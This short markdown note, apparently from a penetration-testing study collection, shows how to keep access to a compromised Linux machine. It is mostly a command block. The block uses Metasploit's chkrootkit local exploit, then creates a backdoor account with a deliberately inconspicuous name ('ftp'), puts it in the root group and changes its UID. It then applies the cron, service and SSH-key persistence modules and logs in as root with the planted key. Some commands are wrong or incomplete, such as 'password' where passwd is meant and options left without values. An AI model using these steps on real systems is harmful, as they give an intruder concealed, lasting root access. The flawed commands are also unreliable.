---
up: "[[Linux Post Exploitation]]"
---

# Establishing Persistence on Linux

- Gaining an initial foothold is not enough
- Persistence must be achieved
- The techniques will depend on the target configuration

## Demonstration

```bash
> use exploit/unix/local/chkrootkit
> set SESSION
> set CHKROOTKIT
> set LHOST
> run
^Z
> sessions -u <id>
> sessions <id>
# create a backdoor user
# with non sus name
# only work is ssh is on
m> 
$ useradd -m ftp -s /bin/bash
$ password ftp
$ usermod -aG root ftp
$ usermod -u 15 ftp
> use exploit/linux/local/cron_persistence
> use exploit/linux/local/service_persistence
> use post/linux/manage/sshkey_persistence
> set CREATESSHFOLDER true
# create priv key file
$ chmod 0400 ssh_key
ssh -i ssh_key root@<ip>
```
